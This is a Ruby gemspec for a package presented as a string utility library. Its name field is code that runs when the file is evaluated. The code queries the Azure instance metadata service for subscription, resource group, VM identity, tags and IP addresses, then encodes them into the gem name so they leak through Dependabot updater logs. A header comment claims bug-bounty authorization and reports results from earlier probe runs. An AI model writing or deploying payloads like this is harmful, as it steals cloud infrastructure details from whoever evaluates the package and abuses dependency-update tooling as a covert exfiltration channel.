# frozen_string_literal: true
#
# HYP-F011-D v1.5 probe payload — capture /metadata/instance response data.
#
# Authorization: bug bounty research authorized by HackerOne GitHub program
# (programs/github/scope.md). All probes within program scope; impact-proof
# captured via PEP-503-safe encoding in gemspec name (visible in updater log).
#
# v1.4 results (run 25617537204) confirmed:
#   GET /metadata/instance?api-version=2021-02-01 → 200 (Azure IMDS reachable!)
#   But proxy only logs error bodies — 200 response body invisible to us.
#   v1.5 retries and ENCODES response fields into gem name slot
#   (visible in updater log: "Latest version is XYZ" / dep-name in commits).
#
# Boundary-verification scope:
#   D-INSTANCE — Capture Azure VM /metadata/instance fields:
#                subscriptionId, resourceGroupName, vmId, name, location,
#                vmSize, publisher, offer, sku, osType
#                These reveal the Dependabot fleet VM identity:
#                Azure subscription owner + resource group + VM info.

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"

      result_parts = []

      # ---- Capture /metadata/instance response ---------------------------
      begin
        uri = URI("http://168.63.129.16/metadata/instance?api-version=2021-02-01")
        h = Net::HTTP.new(uri.host, uri.port)
        h.open_timeout = 4
        h.read_timeout = 6
        req = Net::HTTP::Get.new(uri.request_uri)
        req["Metadata"] = "true"
        rsp = h.request(req)
        body = rsp.body.to_s
        result_parts << "code-#{rsp.code}"
        result_parts << "len-#{body.length}"

        if rsp.code == "200" && body.length > 0
          parsed = JSON.parse(body) rescue nil
          if parsed
            # Extract compute fields
            compute = parsed["compute"] || {}
            ["subscriptionId", "resourceGroupName", "vmId", "name", "location",
             "vmSize", "publisher", "offer", "sku", "osType",
             "osProfile", "tags", "tagsList"].each do |k|
              v = compute[k]
              if v.is_a?(String)
                result_parts << "#{k.gsub(/[^A-Za-z]/,'')[0,12]}-#{v.gsub(/[^A-Za-z0-9]/,'').slice(0, 32)}"
              elsif v.is_a?(Array) && !v.empty?
                result_parts << "#{k.gsub(/[^A-Za-z]/,'')[0,8]}-#{v.first.to_s.gsub(/[^A-Za-z0-9]/,'').slice(0, 24)}"
              end
            end

            # Network fields (limited)
            net = parsed["network"] || {}
            (net["interface"] || []).first(1).each do |nic|
              priv = (nic.dig("ipv4", "ipAddress") || []).first
              if priv
                addr = priv["privateIpAddress"]
                pubip = priv["publicIpAddress"]
                result_parts << "privIP-#{(addr || '').gsub(/[^0-9.]/,'').gsub('.','x')}"
                result_parts << "pubIP-#{(pubip || '').gsub(/[^0-9.]/,'').gsub('.','x')}" if pubip && !pubip.empty?
              end
            end
          else
            result_parts << "parsefail"
          end
        end
      rescue => e
        result_parts << "err-#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 12]}"
      end

      summary = result_parts.join("-").gsub(/[^A-Za-z0-9-]/, "x")[0, 200]
      "useful-string-utils-#{summary}"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]

  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
